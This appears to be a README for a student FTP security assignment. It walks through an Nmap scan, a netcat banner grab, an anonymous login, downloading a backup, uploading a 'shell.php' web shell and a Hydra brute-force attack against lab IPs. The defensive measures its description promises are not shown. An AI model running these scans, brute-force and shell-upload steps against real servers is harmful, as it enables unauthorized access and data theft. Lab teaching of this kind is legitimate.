# ftp-security-assignment
A practical cybersecurity assignment exploring FTP (File Transfer Protocol), including real-world enumeration, attack techniques (brute force, anonymous access), and defensive measures with command-line examples using Nmap and FTP.
## 🧪 Practical Demonstration (Command Examples)

This section shows real-world commands used to discover and interact with FTP services.

---

###  1. Scanning for FTP with Nmap

```bash
nmap -p 21 -sV 192.168.56.101 
```

**Explanation:**

* `-p 21` → scans FTP port
* `-sV` → detects service version

**Sample Output:**

```
21/tcp open  ftp  vsftpd 3.0.3
```

---

###  2. Banner Grabbing

```bash
nc 192.168.1.1 21
```

**Output:**

```
220 (vsFTPd 3.0.3)
```

---

###  3. Connecting to FTP Server

```bash
ftp 192.168.1.1
```

---

###  4. Anonymous Login Attempt

```bash
Name: anonymous
Password: anonymous
```

---

###  5. Listing Files

```bash
ls
```

---

###  6. Downloading a File

```bash
get backup.zip
```

---

###  7. Uploading a File

```bash
put shell.php
```

---

###  8. Exiting FTP

```bash
bye
```

---

###  9. Brute Force Example (Hydra)

```bash
hydra -l admin -P passwords.txt ftp://192.168.1.1
```

**Explanation:**

* `-l` → username
* `-P` → password list

---

## ⚠️ Ethical Note

All commands are for educational purposes only and should be used in authorized lab environments.
